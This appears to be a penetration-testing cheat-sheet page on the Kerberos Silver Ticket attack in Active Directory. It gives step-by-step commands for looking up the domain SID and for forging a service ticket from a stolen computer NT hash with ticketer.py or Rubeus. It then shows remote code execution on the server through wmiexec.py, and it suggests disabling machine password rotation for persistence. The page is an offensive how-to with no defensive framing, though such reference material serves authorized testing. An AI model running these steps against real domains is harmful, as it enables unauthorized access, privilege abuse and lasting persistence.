# Silver Ticket

## Silver Ticket [t-ad-kerberos-forging_silver_ticket]

Silver Tickets allows to access the host if it's password hash is compromised.
Service Tickets are encrypted based on the service kerberos key. If the service account is compromised it`s possible to craft arbitary tickets with any user or privileges. For services runing as a system account PAC validation (for the KDC checksum) is not occurred.
The computer accounts reset their passwords every 30 days by default and the process is initiated by the computer itself. By cahgning registry key *HKEY_LOCAL_MACHINE it`s possible to disable the password update. It allows to to persist access even after all other password are changed, that makes Silver Ticket attack a perfect persistance technique as well.

### 1.1 Get the domain SID




**option 1: impacket-lookupsid**

{% code overflow="wrap" %}
```bash
impacket-lookupsid domain.com/user@dc.domain.com
```
{% endcode %}


**option 2: whoami**

{% code overflow="wrap" %}
```bash
whoami /all
```
{% endcode %}

{% hint style="info" %}Domain SID is the User`s sid without the last part

{% endhint %}

### 1.2 Forge a TGS ticket (silver ticket) using the computer`s NT password hash




**option 1: ticketer.py**

{% code overflow="wrap" %}
```bash
ticketer.py -nthash <computer_nthash> -domain-sid <domain-sid> -domain domain.com -spn cifs/server.domain.com -groups 512 tester
```
{% endcode %}


**option 2: Rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe silver /service:host/server.domain.com /user:user /rc4:<NTHASH> /sid:<domain SID>
```
{% endcode %}

### 1.3 Use any kerberos-aware tool to access the server



{% code overflow="wrap" %}
```bash
KRB5CCNAME=tester.ccache wmiexec.py -k server.domain.com
```
{% endcode %}

